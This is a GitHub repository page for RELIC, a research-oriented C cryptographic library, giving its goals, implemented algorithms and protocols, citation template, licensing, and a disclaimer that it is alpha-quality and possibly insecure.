| [.indent.pro](/relic-toolkit/relic/blob/main/.indent.pro ".indent.pro") | | [.indent.pro](/relic-toolkit/relic/blob/main/.indent.pro ".indent.pro") |  |  |
| [.travis.yml](/relic-toolkit/relic/blob/main/.travis.yml ".travis.yml") | | [.travis.yml](/relic-toolkit/relic/blob/main/.travis.yml ".travis.yml") |  |  |
| [CMakeLists.txt](/relic-toolkit/relic/blob/main/CMakeLists.txt "CMakeLists.txt") | | [CMakeLists.txt](/relic-toolkit/relic/blob/main/CMakeLists.txt "CMakeLists.txt") |  |  |
| [COPYRIGHT](/relic-toolkit/relic/blob/main/COPYRIGHT "COPYRIGHT") | | [COPYRIGHT](/relic-toolkit/relic/blob/main/COPYRIGHT "COPYRIGHT") |  |  |
| [LICENSE](/relic-toolkit/relic/blob/main/LICENSE "LICENSE") | | [LICENSE](/relic-toolkit/relic/blob/main/LICENSE "LICENSE") |  |  |
| [LICENSE.Apache-2.0](/relic-toolkit/relic/blob/main/LICENSE.Apache-2.0 "LICENSE.Apache-2.0") | | [LICENSE.Apache-2.0](/relic-toolkit/relic/blob/main/LICENSE.Apache-2.0 "LICENSE.Apache-2.0") |  |  |
| [LICENSE.LGPL-2.1](/relic-toolkit/relic/blob/main/LICENSE.LGPL-2.1 "LICENSE.LGPL-2.1") | | [LICENSE.LGPL-2.1](/relic-toolkit/relic/blob/main/LICENSE.LGPL-2.1 "LICENSE.LGPL-2.1") |  |  |
| [README.md](/relic-toolkit/relic/blob/main/README.md "README.md") | | [README.md](/relic-toolkit/relic/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* License
#

[![Project stats](https://camo.githubusercontent.com/d9d26303f8acfd8eadb9a7c3c7020593ab9643402d97e2b7eba5536ec138bc5b/68747470733a2f2f7777772e6f70656e6875622e6e65742f702f72656c69632d746f6f6c6b69742f776964676574732f70726f6a6563745f7468696e5f62616467652e676966)](https://www.openhub.net/p/relic-toolkit)
[![GHA Status](https://github.com/relic-toolkit/relic/actions/workflows/easy.yml/badge.svg)](https://github.com/relic-toolkit/relic/actions/workflows/easy.yml)
[![GHA Status](https://github.com/relic-toolkit/relic/actions/workflows/gmp.yml/badge.svg)](https://github.com/relic-toolkit/relic/actions/workflows/gmp.yml)
[![GHA Status](https://github.com/relic-toolkit/relic/actions/workflows/bls12-381.yml/badge.svg)](https://github.com/relic-toolkit/relic/actions/workflows/bls12-381.yml)

RELIC is a modern research-oriented cryptographic meta-toolkit with emphasis on efficiency and flexibility. RELIC can be used to build efficient and usable cryptographic toolkits tailored for specific security levels and algorithmic choices.

### Goals

RELIC is an ongoing project and features will be added on demand. The focus is to provide:

* Ease of portability and inclusion of architecture-dependent code
* Simple experimentation with alternative implementations
* Tests and benchmarks for every implemented function
* Flexible configuration
* Maximum efficiency

### Algorithms

RELIC implements to date:

* Multiple-precision integer arithmetic
* Prime and Binary field arithmetic
* Elliptic curves over prime and binary fields (NIST curves and pairing-friendly curves)
* Bilinear maps and related extension fields
* Cryptographic protocols (RSA, Rabin, ECDSA, ECMQV, ECSS (Schnorr), ECIES, Sakai-Ohgishi-Kasahara ID-based authenticated key agreement, Boneh-Lynn-Schacham and Boneh-Boyen short signatures, Paillier and Benaloh homomorphic encryption systems)

### Citing

If you use RELIC, please cite using the template below:

```
@misc{relic-toolkit,
    author = {D. F. Aranha and C. P. L. GouvÃªa and T. Markmann and R. S. Wahby and K. Liao},
    title = {{RELIC is an Efficient LIbrary for Cryptography}},
    howpublished = {\url{https://github.com/relic-toolkit/relic}},
}

```

### Build instructions

Instructions for building the library can be found in the [Wiki](https://github.com/relic-toolkit/relic/wiki/Building).

### Support

You can probably get some help over the official mailing list at `relic-discuss@googlegroups.com`

If you like the library, please consider supporting development through [Paypal](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=R7D6ZE3BLMTF2&lc=BR&item_name=RELIC%20Development&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted).

### Licensing

This work is dual-licensed under Apache 2.0 and LGPL 2.1-or-above to encourage collaboration with other research groups and contributions from the industry. You can choose between one of them if you use this work.

`SPDX-License-Identifier: Apache-2.0 OR LGPL-2.1`

Starting from version 0.3.3, static linking and changes in the configuration or build system are explicitly exempted from representing derived works. Please refer to the LICENSE files for additional details.

### Disclaimer

RELIC is at best alpha-quality software. Implementations may not be correct or secure and may include patented algorithms. There are *many* configuration options which make the library horribly insecure. Backward API compatibility with early versions may not necessarily be maintained. Side-channel and fault injection attacks are not considered in particular, unless it is explicitly noted. Use at your own risk.

## About

Code

### Resources

[Readme](#readme-ov-file)
### License

[View license](#License-1-ov-file)

[Activity](/relic-toolkit/relic/activity)
[Custom properties](/relic-toolkit/relic/custom-properties)
### Stars

[**468**
stars](/relic-toolkit/relic/stargazers)
### Watchers

[**33**
watching](/relic-toolkit/relic/watchers)
### Forks

[**180**
forks](/relic-toolkit/relic/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic&report=relic-toolkit+%28user%29)

## [Releases 12](/relic-toolkit/relic/releases)

[RELIC version 0.7.0
Latest

Dec 27, 2024](/relic-toolkit/relic/releases/tag/0.7.0)
[+ 11 releases](/relic-toolkit/relic/releases)

## [Packages 0](/orgs/relic-toolkit/packages?repo_name=relic)

No packages published

## [Contributors 46](/relic-toolkit/relic/graphs/contributors)

[+ 32 contributors](/relic-toolkit/relic/graphs/contributors)

## Languages

* [C
  82.6%](/relic-toolkit/relic/search?l=c)
* [Assembly
  15.1%](/relic-toolkit/relic/search?l=assembly)
* [CMake
  1.3%](/relic-toolkit/relic/search?l=cmake)
* Other
  1.0%

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.


